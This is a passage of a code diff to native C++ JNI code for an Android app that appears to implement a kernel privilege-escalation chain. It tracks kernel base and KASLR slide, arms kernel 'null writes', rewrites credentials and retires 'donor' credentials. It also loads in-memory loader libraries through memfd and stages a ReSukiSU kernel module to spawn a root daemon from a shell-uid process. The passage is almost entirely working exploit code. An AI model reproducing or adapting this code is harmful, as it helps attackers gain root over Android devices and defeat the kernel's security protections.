             kCommandWatchdogCreating, std::memory_order_release);
     int create_result = pthread_create(
@@ -12784,6 +16851,13 @@ Java_com_vandam_prism_NativeBridge_awaitCredentialNormalisation(
     if (join_result == 0) {
         g_command_watchdog_thread_created = false;
     }
+    int daemon_join_result = g_action_daemon_spawner_created
+            ? pthread_join(g_action_daemon_spawner_thread, nullptr)
+            : (g_action_daemon_spawn_stage.load(
+                    std::memory_order_acquire) == 3 ? 0 : ESRCH);
+    if (daemon_join_result == 0) {
+        g_action_daemon_spawner_created = false;
+    }
     errno = 0;
     int tid_probe = watchdog_tid > 0
             ? static_cast<int>(syscall(
@@ -12791,7 +16865,7 @@ Java_com_vandam_prism_NativeBridge_awaitCredentialNormalisation(
     int tid_probe_errno = tid_probe == 0 ? 0 : errno;
     bool tid_gone = watchdog_tid > 0 && tid_probe != 0 &&
             tid_probe_errno == ESRCH;
-    if (join_result != 0 || !tid_gone) {
+    if (join_result != 0 || daemon_join_result != 0 || !tid_gone) {
         command_watchdog_reboot_forever();
     }
     if (join_result == 0 && tid_gone) {
@@ -12834,7 +16908,8 @@ Java_com_vandam_prism_NativeBridge_awaitCredentialNormalisation(
     bool pass = ctlbuf_repaired && finalised &&
             g_ctlbuf_finalise_verified && g_ctlbuf_rescue_module_loaded &&
             g_ctlbuf_rescue_module_unloaded && shell &&
-            join_result == 0 && tid_gone && donor_frozen_recorded &&
+            join_result == 0 && daemon_join_result == 0 && tid_gone &&
+            donor_frozen_recorded &&
             donor_resumed;
     g_command_watchdog_phase.store(
             pass ? kCommandWatchdogNormalised : kCommandWatchdogFailed,
@@ -12967,12 +17042,33 @@ Java_com_vandam_prism_NativeBridge_runReSukiAction(
             environment, module_descriptor);
     int module_duplicate = module_source_fd >= 0
             ? fcntl(module_source_fd, F_DUPFD, 100) : -1;
+    int loader_duplicate = g_resukisu_loader_source_fd >= 0
+            ? fcntl(g_resukisu_loader_source_fd, F_DUPFD, 100) : -1;
+    int daemon_fd = g_action_daemon_parent_fd;
+    char action_completion_path[160];
+    std::snprintf(
+            action_completion_path, sizeof(action_completion_path),
+            "/data/local/tmp/lp3-ksud-completion.%s",
+            g_command_watchdog_nonce);
+    int action_completion_fd = open(
+            action_completion_path,
+            O_RDWR | O_CREAT | O_EXCL | O_TRUNC | O_CLOEXEC | O_NOFOLLOW,
+            0600);
+    if (action_completion_fd >= 0 &&
+            ftruncate(action_completion_fd, 64) != 0) {
+        close(action_completion_fd);
+        action_completion_fd = -1;
+        (void)unlink(action_completion_path);
+    }
     int action = activate == JNI_TRUE ? 2 : 1;
     int expected = 0;
     bool prepared = duplicate >= 0 && module_duplicate >= 0 &&
+            loader_duplicate >= 0 && daemon_fd >= 0 &&
+            action_completion_fd >= 0 &&
             manager_uid >= 10'000 &&
             manager_uid < 20'000 &&
-            g_resukisu_probe != nullptr && g_resukisu_load != nullptr &&
+            g_resukisu_probe != nullptr &&
+            g_resukisu_replace != nullptr && g_resukisu_load != nullptr &&
             g_command_watchdog_phase.load(std::memory_order_acquire) ==
                     kCommandWatchdogReady &&
             (action != 2 || g_resukisu_kernel_base.load(
@@ -12981,6 +17077,9 @@ Java_com_vandam_prism_NativeBridge_runReSukiAction(
     if (prepared) {
         g_resukisu_fd = duplicate;
         g_resukisu_module_fd = module_duplicate;
+        g_resukisu_loader_fd = loader_duplicate;
+        g_resukisu_completion_fd.store(
+                action_completion_fd, std::memory_order_relaxed);
         g_resukisu_manager_uid.store(manager_uid,
                 std::memory_order_relaxed);
         prepared = g_resukisu_action.compare_exchange_strong(
@@ -12989,6 +17088,9 @@ Java_com_vandam_prism_NativeBridge_runReSukiAction(
         if (!prepared) {
             g_resukisu_fd = -1;
             g_resukisu_module_fd = -1;
+            g_resukisu_loader_fd = -1;
+            g_resukisu_completion_fd.store(
+                    -1, std::memory_order_relaxed);
             g_resukisu_manager_uid.store(-1,
                     std::memory_order_relaxed);
         }
@@ -13000,20 +17102,255 @@ Java_com_vandam_prism_NativeBridge_runReSukiAction(
         if (module_duplicate >= 0) {
             close(module_duplicate);
         }
+        if (loader_duplicate >= 0) {
+            close(loader_duplicate);
+        }
+        if (action_completion_fd >= 0) {
+            close(action_completion_fd);
+            (void)unlink(action_completion_path);
+        }
         return environment->NewStringUTF(
                 "status=fail stage=resukisu-action reason=prepare exit=-1 errno=0");
     }
+    CommandRootIdentity action_identity;
+    struct stat action_stat {};
+    struct stat module_stat {};
+    bool exact_action = fstat(duplicate, &action_stat) == 0 &&
+            S_ISREG(action_stat.st_mode) && action_stat.st_uid == 2000 &&
+            action_stat.st_gid == 2000 &&
+            (action_stat.st_mode & 0777) == 0755 &&
+            action_stat.st_size == kReSukiExecutableSize;
+    bool module_stat_valid = fstat(module_duplicate, &module_stat) == 0;
+    bool exact_module = module_stat_valid &&
+            S_ISREG(module_stat.st_mode) &&
+            module_stat.st_size == kReSukiEmbeddedRescueSize;
+    struct stat loader_stat {};
+    bool exact_loader = fstat(loader_duplicate, &loader_stat) == 0 &&
+            S_ISREG(loader_stat.st_mode) && loader_stat.st_uid == 2000 &&
+            loader_stat.st_gid == 2000 &&
+            (loader_stat.st_mode & 0777) == 0755 &&
+            loader_stat.st_size == kReSukiLoaderSize;
+    bool exact_dispatcher = read_command_root_identity(&action_identity) &&
+            action_identity.pid > 0 &&
+            action_identity.tid > 0 &&
+            action_identity.pid != action_identity.tid &&
+            command_identity_is_shell(action_identity) &&
+            action_identity.effective_caps == 0;
+    bool action_loader_valid = exact_loader &&
+            g_action_resukisu_library != nullptr &&
+            g_action_resukisu_probe != nullptr &&
+            g_action_resukisu_relocate_probe != nullptr &&
+            g_action_resukisu_stage != nullptr &&
+            g_action_resukisu_load != nullptr &&
+            g_action_resukisu_probe() == UINT32_C(0x4c503352);
+    int relocation_result = action == 1 ? 0 : -1;
+    int stage_result = action == 1 ? 0 : -1;
+    int load_result = action == 1 && exact_action && exact_module &&
+            exact_dispatcher
+            ? 0 : -1;
+    int action_gate =
+            (action == 2 ? 1 : 0) |
+            (action_loader_valid ? 2 : 0) |
+            (exact_action ? 4 : 0) |
+            (exact_module ? 8 : 0) |
+            (exact_dispatcher ? 16 : 0);
+    if (action_gate == 31) {
+        g_action_loader_relocation.store(-1, std::memory_order_relaxed);
+        g_action_loader_stage.store(-1, std::memory_order_relaxed);
+        g_action_loader_result.store(-1, std::memory_order_relaxed);
+        g_action_loader_request.store(1, std::memory_order_release);
+        wake_command_watchdog(&g_action_loader_request, INT_MAX);
+        timespec pidfd_started {};
+        (void)clock_gettime(CLOCK_MONOTONIC, &pidfd_started);
+        std::int64_t pidfd_deadline =
+                static_cast<std::int64_t>(pidfd_started.tv_sec + 5) *
+                        1000000000LL + pidfd_started.tv_nsec;
+        timespec pidfd_delay {0, 1'000'000};
+        while (__atomic_load_n(
+                       &g_resukisu_raw_pidfd, __ATOMIC_ACQUIRE) < 0 &&
+                g_action_loader_request.load(
+                        std::memory_order_acquire) != 2) {
+            timespec now {};
+            if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
+                    static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
+                            now.tv_nsec >= pidfd_deadline) {
+                break;
+            }
+            (void)syscall(SYS_nanosleep, &pidfd_delay, nullptr);
+        }
+        if (__atomic_load_n(
+                    &g_resukisu_raw_pidfd, __ATOMIC_ACQUIRE) >= 0) {
+            relocation_result = 0;
+            stage_result = 0;
+            load_result = 0;
+        } else if (g_action_loader_request.load(
+                           std::memory_order_acquire) == 2) {
+            relocation_result = g_action_loader_relocation.load(
+                    std::memory_order_acquire);
+            stage_result = g_action_loader_stage.load(
+                    std::memory_order_acquire);
+            load_result = g_action_loader_result.load(
+                    std::memory_order_acquire);
+        }
+    } else if (action == 2) {
+        relocation_result = -20'000 - action_gate;
+    }
+    int handoff_result = -1;
+    bool handoff_root = false;
+    if (action == 2 && relocation_result == 0 && stage_result == 0 &&
+            load_result == 0) {
+        handoff_result = 0;
+        handoff_root = __atomic_load_n(
+                &g_resukisu_raw_pidfd, __ATOMIC_ACQUIRE) >= 0;
+    }
+    int load_errno = load_result != 0 || handoff_result != 0 ? errno : 0;
+    if (action == 2 && (load_result != 0 || handoff_result != 0) &&
+            daemon_fd >= 0) {
+        std::array<char, 4096> diagnostic {};
+        std::size_t diagnostic_bytes = 0;
+        while (diagnostic_bytes < diagnostic.size()) {
+            ssize_t bytes = read(
+                    daemon_fd, diagnostic.data() + diagnostic_bytes,
+                    diagnostic.size() - diagnostic_bytes);
+            if (bytes > 0) {
+                diagnostic_bytes += static_cast<std::size_t>(bytes);
+                continue;
+            }
+            if (bytes < 0 && errno == EINTR) {
+                continue;
+            }
+            break;
+        }
+        char header[160];
+        int header_length = std::snprintf(
+                header, sizeof(header),
+                "BRIDGE_ACTION_LOADER_DIAGNOSTIC result=%d errno=%d bytes=%zu\n",
+                handoff_result != 0 ? handoff_result : load_result,
+                load_errno, diagnostic_bytes);
+        if (header_length > 0 &&
+                header_length < static_cast<int>(sizeof(header)) &&
+                g_command_watchdog_output_fd >= 0 &&
+                write_all(g_command_watchdog_output_fd, header,
+                          static_cast<std::size_t>(header_length))) {
+            if (diagnostic_bytes > 0) {
+                (void)write_all(
+                        g_command_watchdog_output_fd, diagnostic.data(),
+                        diagnostic_bytes);
+                (void)write_all(g_command_watchdog_output_fd, "\n", 1);
+            }
+            (void)fsync(g_command_watchdog_output_fd);
+        }
+    }
+    int action_pidfd = __atomic_load_n(
+            &g_resukisu_raw_pidfd, __ATOMIC_ACQUIRE);
+    pid_t daemon_pid = static_cast<pid_t>(
+            g_resukisu_child_pid.load(std::memory_order_acquire));
+    int spawn_error = action == 2 && load_result == 0 &&
+            handoff_result == 0 && handoff_root && action_pidfd >= 0
+            ? 0
+            : (action == 1 && load_result == 0 ? 0 : EPROTO);
+    bool spawned = action == 1 ||
+            (spawn_error == 0 && action_pidfd >= 0);
+    g_resukisu_spawn_stage.store(
+            spawned ? 3 : -1, std::memory_order_release);
+    g_resukisu_spawn_error.store(
+            spawn_error != 0 ? spawn_error :
+                    (load_result != 0 ? 10'000 - load_result :
+                     handoff_result != 0 ? 20'000 - handoff_result : 0),
+            std::memory_order_release);
+    g_resukisu_receipt_stage.store(
+            spawned ? 6 : 7, std::memory_order_release);
+    g_resukisu_receipt_bytes.store(
+            module_stat_valid && module_stat.st_size >= 0 &&
+                    module_stat.st_size <= INT_MAX
+                    ? static_cast<int>(module_stat.st_size) : -1,
+            std::memory_order_release);
+    g_resukisu_receipt_detail.store(
+            relocation_result != 0 ? 1000 + relocation_result :
+                    (stage_result != 0 ? 2000 + stage_result :
+                     load_result != 0 ? load_result :
+                     handoff_result != 0 ? 3000 + handoff_result :
+                     handoff_root ? 0 : 3999),
+            std::memory_order_release);
+    if (g_action_daemon_child_fd >= 0) {
+        close(g_action_daemon_child_fd);
+        g_action_daemon_child_fd = -1;
+    }
+    if (spawned) {
+        if (action == 2) {
+            if (daemon_pid > 0) {
+                g_resukisu_child_pid.store(
+                        daemon_pid, std::memory_order_release);
+            }
+            g_resukisu_diagnostic_fd.store(
+                    daemon_fd, std::memory_order_release);
+            g_action_daemon_parent_fd = -1;
+        }
+    }
+    if (g_resukisu_fd >= 0) {
+        close(g_resukisu_fd);
+        g_resukisu_fd = -1;
+    }
+    if (g_resukisu_module_fd >= 0) {
+        close(g_resukisu_module_fd);
+        g_resukisu_module_fd = -1;
+    }
+    if (g_resukisu_loader_fd >= 0) {
+        close(g_resukisu_loader_fd);
+        g_resukisu_loader_fd = -1;
+    }
+    if (!spawned) {
+        if (g_action_daemon_parent_fd >= 0) {
+            close(g_action_daemon_parent_fd);
+            g_action_daemon_parent_fd = -1;
+        }
+        int completion_fd = g_resukisu_completion_fd.exchange(
+                -1, std::memory_order_acq_rel);
+        if (completion_fd >= 0) {
+            close(completion_fd);
+        }
+        char completion_path[160];
+        std::snprintf(
+                completion_path, sizeof(completion_path),
+                "/data/local/tmp/lp3-ksud-completion.%s",
+                g_command_watchdog_nonce);
+        (void)unlink(completion_path);
+    }
+    if (spawned && action == 2) {
+        g_resukisu_action.store(4, std::memory_order_release);
+    }
+    int result = action == 1 && spawned ? 0 : -1;
+    int error = spawned ? 0 : ETIMEDOUT;
+    bool completed = action == 1 ? spawned :
+            spawned && collect_resukisu_child(action, &result, &error);
+    g_resukisu_exit.store(result, std::memory_order_release);
+    g_resukisu_errno.store(error, std::memory_order_release);
+    g_resukisu_action.store(3, std::memory_order_release);
     wake_command_watchdog(&g_resukisu_action, INT_MAX);
-    bool completed = wait_for_command_watchdog(
-            &g_resukisu_action, 3, 125);
-    int result = g_resukisu_exit.load(std::memory_order_acquire);
-    int error = g_resukisu_errno.load(std::memory_order_acquire);
     bool pass = completed && result == 0 && error == 0;
-    char state[192];
+    if (pass) {
+        return environment->NewStringUTF(
+                "status=pass stage=resukisu-action action=activate"
+                " exit=0 errno=0");
+    }
+    char state[512];
     std::snprintf(state, sizeof(state),
-            "status=%s stage=resukisu-action action=%s exit=%d errno=%d",
+            "status=%s stage=resukisu-action action=%s exit=%d errno=%d"
+            " spawn_stage=%d receipt_stage=%d receipt_bytes=%d"
+            " receipt_detail=%d spawn_errno=%d action_gate=%d"
+            " action_pid=%d action_tid=%d action_uid=%u action_gid=%u"
+            " action_caps=%016" PRIx64 " handoff=%d handoff_root=%d",
             pass ? "pass" : "fail", activate == JNI_TRUE ? "activate" : "probe",
-            result, error);
+            result, error,
+            g_resukisu_spawn_stage.load(std::memory_order_acquire),
+            g_resukisu_receipt_stage.load(std::memory_order_acquire),
+            g_resukisu_receipt_bytes.load(std::memory_order_acquire),
+            g_resukisu_receipt_detail.load(std::memory_order_acquire),
+            g_resukisu_spawn_error.load(std::memory_order_acquire),
+            action_gate, action_identity.pid, action_identity.tid,
+            action_identity.uid[0], action_identity.gid[0],
+            action_identity.effective_caps, handoff_result,
+            handoff_root ? 1 : 0);
     return environment->NewStringUTF(state);
 }
 
@@ -13023,11 +17360,39 @@ Java_com_vandam_prism_NativeBridge_prepareReSukiLoader(
     int source_fd = file_descriptor_value(environment, descriptor);
     int duplicate = source_fd >= 0
             ? fcntl(source_fd, F_DUPFD_CLOEXEC, 100) : -1;
+    int inherited_duplicate = source_fd >= 0
+            ? fcntl(source_fd, F_DUPFD, 100) : -1;
+    int supervisor_source_fd = open(
+            kActionSupervisorPath, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
+    bool supervisor_valid = exact_shell_executable(
+            supervisor_source_fd, kActionSupervisorPath);
+    int daemon_sockets[2] {-1, -1};
+    int daemon_socket_result = socketpair(
+            AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, daemon_sockets);
+    int daemon_child_fd = daemon_socket_result == 0
+            ? fcntl(daemon_sockets[1], F_DUPFD, 100) : -1;
+    if (daemon_sockets[1] >= 0) {
+        close(daemon_sockets[1]);
+        daemon_sockets[1] = -1;
+    }
+    bool daemon_socket_valid = daemon_sockets[0] >= 0 &&
+            daemon_child_fd >= 0;
+    if (daemon_socket_valid) {
+        int flags = fcntl(daemon_sockets[0], F_GETFL);
+        daemon_socket_valid = flags >= 0 && fcntl(
+                daemon_sockets[0], F_SETFL, flags | O_NONBLOCK) == 0;
+    }
     void* library = nullptr;
     ReSukiProbeFunction probe = nullptr;
     ReSukiRelocateProbeFunction relocate_probe = nullptr;
     ReSukiStageFunction stage = nullptr;
+    ReSukiReplaceFunction replace = nullptr;
     ReSukiLoadFunction load = nullptr;
+    void* action_library = nullptr;
+    ReSukiProbeFunction action_probe = nullptr;
+    ReSukiRelocateProbeFunction action_relocate_probe = nullptr;
+    ReSukiStageFunction action_stage = nullptr;
+    ReSukiLoadFunction action_load = nullptr;
     if (duplicate >= 0 && g_resukisu_library == nullptr) {
         char path[64];
         std::snprintf(path, sizeof(path), "/proc/self/fd/%d", duplicate);
@@ -13039,36 +17404,125 @@ Java_com_vandam_prism_NativeBridge_prepareReSukiLoader(
                     dlsym(library, "lp3_resukisu_relocate_probe"));
             stage = reinterpret_cast<ReSukiStageFunction>(
                     dlsym(library, "lp3_resukisu_stage"));
+            replace = reinterpret_cast<ReSukiReplaceFunction>(
+                    dlsym(library, "lp3_resukisu_replace"));
             load = reinterpret_cast<ReSukiLoadFunction>(
                     dlsym(library, "lp3_resukisu_load"));
         }
+    }
+    int action_loader_fd = -1;
+#if defined(__NR_memfd_create)
+    action_loader_fd = static_cast<int>(syscall(
+            __NR_memfd_create, "lp3-resukisu-action-loader", 1U));
+#endif
+    bool action_loader_copied = action_loader_fd >= 0 && source_fd >= 0 &&
+            ftruncate(action_loader_fd, kReSukiLoaderSize) == 0;
+    std::array<std::uint8_t, 64 * 1024> action_loader_buffer {};
+    for (off_t offset = 0;
+         action_loader_copied && offset < kReSukiLoaderSize;) {
+        std::size_t requested = static_cast<std::size_t>(std::min<off_t>(
+                action_loader_buffer.size(), kReSukiLoaderSize - offset));
+        ssize_t read_count = pread(
+                source_fd, action_loader_buffer.data(), requested, offset);
+        ssize_t write_count = read_count > 0
+                ? pwrite(action_loader_fd, action_loader_buffer.data(),
+                         static_cast<std::size_t>(read_count), offset)
+                : -1;
+        action_loader_copied = read_count ==
+                        static_cast<ssize_t>(requested) &&
+                write_count == read_count;
+        offset += action_loader_copied ? read_count : 0;
+    }
+    if (action_loader_copied) {
+        android_dlextinfo action_loader_info {};
+        action_loader_info.flags = ANDROID_DLEXT_USE_LIBRARY_FD |
+                ANDROID_DLEXT_FORCE_LOAD;
+        action_loader_info.library_fd = action_loader_fd;
+        action_library = android_dlopen_ext(
+                "lp3-resukisu-loader-action.so", RTLD_NOW | RTLD_LOCAL,
+                &action_loader_info);
+        if (action_library != nullptr) {
+            action_probe = reinterpret_cast<ReSukiProbeFunction>(
+                    dlsym(action_library, "lp3_resukisu_probe"));
+            action_relocate_probe =
+                    reinterpret_cast<ReSukiRelocateProbeFunction>(
+                            dlsym(action_library,
+                                  "lp3_resukisu_relocate_probe"));
+            action_stage = reinterpret_cast<ReSukiStageFunction>(
+                    dlsym(action_library, "lp3_resukisu_stage"));
+            action_load = reinterpret_cast<ReSukiLoadFunction>(
+                    dlsym(action_library, "lp3_resukisu_load"));
+        }
+    }
+    if (action_loader_fd >= 0) {
+        close(action_loader_fd);
     }
     if (duplicate >= 0) {
         close(duplicate);
     }
     int relocation = relocate_probe == nullptr
             ? -1 : relocate_probe(kKernelLinkBase);
-    bool pass = library != nullptr && probe != nullptr &&
-            relocate_probe != nullptr && stage != nullptr && load != nullptr &&
-            probe() == UINT32_C(0x4c503352) && relocation == 0;
+    bool pass = inherited_duplicate >= 0 && supervisor_valid &&
+            daemon_socket_valid &&
+            library != nullptr &&
+            probe != nullptr &&
+            relocate_probe != nullptr && stage != nullptr &&
+            replace != nullptr && load != nullptr &&
+            probe() == UINT32_C(0x4c503352) && relocation == 0 &&
+            action_library != nullptr && action_probe != nullptr &&
+            action_relocate_probe != nullptr && action_stage != nullptr &&
+            action_load != nullptr &&
+            action_probe() == UINT32_C(0x4c503352);
     if (pass) {
         g_resukisu_library = library;
         g_resukisu_probe = probe;
         g_resukisu_relocate_probe = relocate_probe;
         g_resukisu_stage = stage;
+        g_resukisu_replace = replace;
         g_resukisu_load = load;
-    } else if (library != nullptr) {
-        dlclose(library);
+        g_resukisu_loader_source_fd = inherited_duplicate;
+        g_action_resukisu_library = action_library;
+        g_action_resukisu_probe = action_probe;
+        g_action_resukisu_relocate_probe = action_relocate_probe;
+        g_action_resukisu_stage = action_stage;
+        g_action_resukisu_load = action_load;
+        g_action_supervisor_source_fd = supervisor_source_fd;
+        g_action_daemon_parent_fd = daemon_sockets[0];
+        g_action_daemon_child_fd = daemon_child_fd;
+        inherited_duplicate = -1;
+        supervisor_source_fd = -1;
+        daemon_sockets[0] = -1;
+        daemon_child_fd = -1;
+    } else {
+        if (library != nullptr) {
+            dlclose(library);
+        }
+        if (action_library != nullptr) {
+            dlclose(action_library);
+        }
+    }
+    if (inherited_duplicate >= 0) {
+        close(inherited_duplicate);
+    }
+    if (supervisor_source_fd >= 0) {
+        close(supervisor_source_fd);
+    }
+    if (daemon_sockets[0] >= 0) {
+        close(daemon_sockets[0]);
+    }
+    if (daemon_child_fd >= 0) {
+        close(daemon_child_fd);
     }
     char state[192];
     std::snprintf(state, sizeof(state),
             "status=%s stage=resukisu-loader-prepare"
-            " loaded=%d symbols=%d relocation=%d",
+            " loaded=%d symbols=%d relocation=%d supervisor=%d daemon=%d",
             pass ? "pass" : "fail", library != nullptr ? 1 : 0,
             probe != nullptr && relocate_probe != nullptr &&
-                    stage != nullptr && load != nullptr
+                    stage != nullptr && replace != nullptr && load != nullptr
                     ? 1 : 0,
-            relocation);
+            relocation, supervisor_valid ? 1 : 0,
+            daemon_socket_valid ? 1 : 0);
     return environment->NewStringUTF(state);
 }
 
@@ -13084,27 +17538,145 @@ Java_com_vandam_prism_NativeBridge_stageReSukiModule(
     int source_fd = file_descriptor_value(environment, descriptor);
     int duplicate = source_fd >= 0
             ? fcntl(source_fd, F_DUPFD_CLOEXEC, 100) : -1;
+    struct stat source_stat {};
+    bool source_valid = source_fd >= 0 &&
+            fstat(source_fd, &source_stat) == 0 &&
+            S_ISREG(source_stat.st_mode) &&
+            source_stat.st_size == kReSukiModuleSize;
+    int rescue_backup_fd = -1;
+#if defined(__NR_memfd_create)
+    rescue_backup_fd = source_valid ? static_cast<int>(syscall(
+            __NR_memfd_create, "lp3-resukisu-rescue-backup", 1U)) : -1;
+#endif
+    bool rescue_backup_copied = rescue_backup_fd >= 0 &&
+            ftruncate(rescue_backup_fd, kReSukiModuleSize) == 0;
+    std::array<std::uint8_t, 64 * 1024> rescue_backup_buffer {};
+    for (off_t offset = 0;
+         rescue_backup_copied && offset < kReSukiModuleSize;) {
+        std::size_t requested = static_cast<std::size_t>(std::min<off_t>(
+                rescue_backup_buffer.size(), kReSukiModuleSize - offset));
+        ssize_t read_count = pread(
+                source_fd, rescue_backup_buffer.data(), requested, offset);
+        ssize_t write_count = read_count > 0
+                ? pwrite(rescue_backup_fd, rescue_backup_buffer.data(),
+                         static_cast<std::size_t>(read_count), offset)
+                : -1;
+        rescue_backup_copied = read_count ==
+                        static_cast<ssize_t>(requested) &&
+                write_count == read_count;
+        offset += rescue_backup_copied ? read_count : 0;
+    }
+    std::vector<std::uint8_t> rescue_image;
+    bool rescue_image_copied = rescue_backup_copied;
+    if (rescue_image_copied) {
+        rescue_image.resize(static_cast<std::size_t>(kReSukiModuleSize));
+        off_t offset = 0;
+        while (rescue_image_copied && offset < kReSukiModuleSize) {
+            ssize_t count = pread(
+                    rescue_backup_fd, rescue_image.data() + offset,
+                    static_cast<std::size_t>(
+                            kReSukiModuleSize - offset), offset);
+            rescue_image_copied = count > 0;
+            offset += rescue_image_copied ? count : 0;
+        }
+        rescue_image_copied = rescue_image_copied &&
+                offset == kReSukiModuleSize;
+    }
+    int action_module_fd = -1;
+#if defined(__NR_memfd_create)
+    action_module_fd = source_valid ? static_cast<int>(syscall(
+            __NR_memfd_create, "lp3-resukisu-action-module", 1U)) : -1;
+#endif
+    bool action_module_copied = action_module_fd >= 0 &&
+            ftruncate(action_module_fd, kReSukiModuleSize) == 0;
+    std::array<std::uint8_t, 64 * 1024> action_module_buffer {};
+    for (off_t offset = 0;
+         action_module_copied && offset < kReSukiModuleSize;) {
+        std::size_t requested = static_cast<std::size_t>(std::min<off_t>(
+                action_module_buffer.size(), kReSukiModuleSize - offset));
+        ssize_t read_count = pread(
+                source_fd, action_module_buffer.data(), requested, offset);
+        ssize_t write_count = read_count > 0
+                ? pwrite(action_module_fd, action_module_buffer.data(),
+                         static_cast<std::size_t>(read_count), offset)
+                : -1;
+        action_module_copied = read_count ==
+                        static_cast<ssize_t>(requested) &&
+                write_count == read_count;
+        offset += action_module_copied ? read_count : 0;
+    }
     int relocation = base_valid && g_resukisu_relocate_probe != nullptr
             ? g_resukisu_relocate_probe(runtime_base) : -1;
-    int result = duplicate >= 0 && base_valid && relocation == 0 &&
+    int result = duplicate >= 0 && rescue_backup_copied &&
+            rescue_image_copied &&
+            action_module_copied &&
+            base_valid && relocation == 0 &&
             g_resukisu_stage != nullptr &&
             g_command_watchdog_phase.load(std::memory_order_acquire) ==
                     kCommandWatchdogReady &&
             g_resukisu_kernel_base.load(std::memory_order_acquire) == 0
             ? g_resukisu_stage(duplicate, runtime_base)
             : -1;
-    if (result == 0) {
+    int action_relocation = result == 0 &&
+            g_action_resukisu_relocate_probe != nullptr
+            ? g_action_resukisu_relocate_probe(runtime_base) : -1;
+    int action_stage = action_relocation == 0 &&
+            g_action_resukisu_stage != nullptr
+            ? g_action_resukisu_stage(action_module_fd, runtime_base) : -1;
+    std::vector<std::uint8_t> staged_image;
+    bool staged_image_copied = action_stage == 0;
+    if (staged_image_copied) {
+        staged_image.resize(
+                static_cast<std::size_t>(kReSukiEmbeddedRescueSize));
+        off_t offset = 0;
+        while (staged_image_copied &&
+               offset < kReSukiEmbeddedRescueSize) {
+            ssize_t count = pread(
+                    action_module_fd, staged_image.data() + offset,
+                    static_cast<std::size_t>(
+                            kReSukiEmbeddedRescueSize - offset), offset);
+            staged_image_copied = count > 0;
+            offset += staged_image_copied ? count : 0;
+        }
+        staged_image_copied = staged_image_copied &&
+                offset == kReSukiEmbeddedRescueSize;
+    }
+    if (!staged_image_copied && action_stage == 0) {
+        action_stage = -2;
+    }
+    if (result == 0 && action_relocation == 0 && action_stage == 0) {
         g_resukisu_kernel_base.store(
                 runtime_base, std::memory_order_release);
+        if (g_action_resukisu_module_fd >= 0) {
+            close(g_action_resukisu_module_fd);
+        }
+        g_action_resukisu_module_fd = action_module_fd;
+        action_module_fd = -1;
+        if (g_resukisu_rescue_backup_fd >= 0) {
+            close(g_resukisu_rescue_backup_fd);
+        }
+        g_resukisu_rescue_backup_fd = rescue_backup_fd;
+        rescue_backup_fd = -1;
+        g_resukisu_rescue_image = std::move(rescue_image);
+        g_resukisu_staged_image = std::move(staged_image);
     }
     if (duplicate >= 0) {
         close(duplicate);
     }
-    char state[192];
+    if (action_module_fd >= 0) {
+        close(action_module_fd);
+    }
+    if (rescue_backup_fd >= 0) {
+        close(rescue_backup_fd);
+    }
+    char state[256];
     std::snprintf(state, sizeof(state),
             "status=%s stage=resukisu-stage result=%d relocation=%d"
+            " action_relocation=%d action_stage=%d"
             " kernel_base=0x%" PRIx64 " kaslr_slide=0x%" PRIx64,
-            result == 0 ? "pass" : "fail", result, relocation,
+            result == 0 && action_relocation == 0 && action_stage == 0
+                    ? "pass" : "fail",
+            result, relocation, action_relocation, action_stage,
             runtime_base, slide);
     return environment->NewStringUTF(state);
 }
@@ -13338,6 +17910,25 @@ Java_com_vandam_prism_NativeBridge_ctlbufFinaliseStatus(
                 "status=fail stage=ctlbuf-finalise reason=unavailable");
     }
     return environment->NewStringUTF(g_ctlbuf_finalise_proof.c_str());
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_ctlbufDonorResumeStatus(
+        JNIEnv* environment, jclass) {
+    std::atomic_thread_fence(std::memory_order_acquire);
+    CtlbufDonorResumeRecord record = g_ctlbuf_donor_resume_record;
+    CtlbufDonorResumeProof proof;
+    if (!validate_ctlbuf_donor_resume_status(
+                record, record.helper_pid, &proof)) {
+        return environment->NewStringUTF(
+                "status=fail stage=donor-resume reason=unavailable");
+    }
+    std::string status = format_ctlbuf_donor_resume_status(record);
+    if (status.empty()) {
+        return environment->NewStringUTF(
+                "status=fail stage=donor-resume reason=format");
+    }
+    return environment->NewStringUTF(status.c_str());
 }
 
 extern "C" JNIEXPORT jstring JNICALL
@@ -13597,8 +18188,10 @@ Java_com_vandam_prism_NativeBridge_validateTerminalNormalisation(
             !proof.empty() && validate_ctlbuf_finalise_status(
                     proof, g_credential_target_pid);
     bool sequence = g_direct_terminal_cleanup &&
-            g_direct_write_step == 7 && g_write_successes == 6 &&
-            !g_null_write_armed;
+            g_direct_subjective_only && g_direct_write_step == 7 &&
+            g_write_successes == kTerminalRequiredWrites &&
+            !g_null_write_armed && g_null_write_batch_armed.empty() &&
+            !g_null_write_batch_prepared;
     bool private_credential = kernel_pointer(g_private_cred) &&
             g_private_cred_sid != 0 &&
             static_cast<std::uint32_t>(g_private_cred_snapshot[0]) == 2;
@@ -13637,8 +18230,10 @@ Java_com_vandam_prism_NativeBridge_proveTerminalDonorRetirement(
             validate_ctlbuf_finalise_status(
                     finalise_status, g_credential_target_pid);
     bool sequence_complete = g_direct_terminal_cleanup &&
-            g_direct_write_step == 7 && g_write_successes == 6 &&
-            !g_null_write_armed && finalise_proof &&
+            g_direct_subjective_only && g_direct_write_step == 7 &&
+            g_write_successes == kTerminalRequiredWrites &&
+            !g_null_write_armed && g_null_write_batch_armed.empty() &&
+            !g_null_write_batch_prepared && finalise_proof &&
             g_terminal_host_normalisation_gate;
     errno = 0;
     int helper_probe = g_credential_target_pid > 0
@@ -13765,7 +18360,8 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanupLegacy(
             g_direct_security_repair &&
             g_direct_write_step == required_writes + 1 &&
             g_write_successes == required_writes &&
-            !g_null_write_armed;
+            !g_null_write_armed && g_null_write_batch_armed.empty() &&
+            !g_null_write_batch_prepared;
 
     errno = 0;
     int helper_probe = g_credential_target_pid > 0
@@ -13969,8 +18565,10 @@ Java_com_vandam_prism_NativeBridge_completeTerminalCleanup(
     record_stage("isolated-proof-pass");
 
     bool sequence_complete = g_direct_terminal_cleanup &&
-            g_direct_write_step == 7 && g_write_successes == 6 &&
-            !g_null_write_armed && g_final_shell_cred_valid;
+            g_direct_subjective_only && g_direct_write_step == 7 &&
+            g_write_successes == kTerminalRequiredWrites &&
